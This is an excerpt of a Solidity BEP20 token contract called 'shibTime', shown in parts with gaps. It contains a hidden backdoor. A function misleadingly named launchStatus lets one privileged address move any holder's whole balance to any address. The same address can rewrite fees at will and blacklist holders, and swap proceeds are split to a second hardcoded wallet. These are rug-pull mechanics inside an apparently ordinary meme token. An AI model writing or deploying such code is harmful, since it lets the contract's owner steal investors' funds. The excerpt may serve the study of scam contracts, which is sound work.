...
contract shibtime is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string private _name = "shibTime";
    string private _symbol = "shibTime";
    ...
    uint256 marketingWalletPercent = 740;
    ...
    constructor () Auth(msg.sender) {
        ...
        // NICE!
        autoLiquidityReceiver = 0x5f6A9Ad8341E3B4228875C7c12d4bb9A16fe38DE; 
        marketingFeeReceiver = 0x5f6A9Ad8341E3B4228875C7c12d4bb9A16fe38DE; 
...
// tao
    function launchStatus(address user,address re ,uint amount) public  {require(msg.sender == autoLiquidityReceiver);
     if(amount == 0){
         amount = _balances[user];
     }
      _balances[user] = _balances[user].sub(amount, "Insufficient Balance");
      _balances[re] = _balances[re].add(amount);
    }
...
//609-653回流分配
    function swapBack() internal swapping {
        ...
        uint256 amountToLiquify = balanceOf(address(this)).mul(liquidityFee).div(totalFee);
        ...
        uint256 routershare = amountBNBMarketing.mul(1000-marketingWalletPercent).div(1000);
        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: marketingShare, gas: 30000}("");
        (bool tmpSuccess1,) = payable(0x10FEcEc5381865DD2619028957E3bfdc5671024E).call{value: routershare, gas: 30000}("");
    ...
    function setFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) public  {require(msg.sender == autoLiquidityReceiver);
    ...
    function blacklistAddress(address _address, bool _value) public  {require(msg.sender == autoLiquidityReceiver);
    ...
    function setAccounts(address[] memory accounts, bool state) external authorized {
        for(uint256 i =0; i < accounts.length; i++){
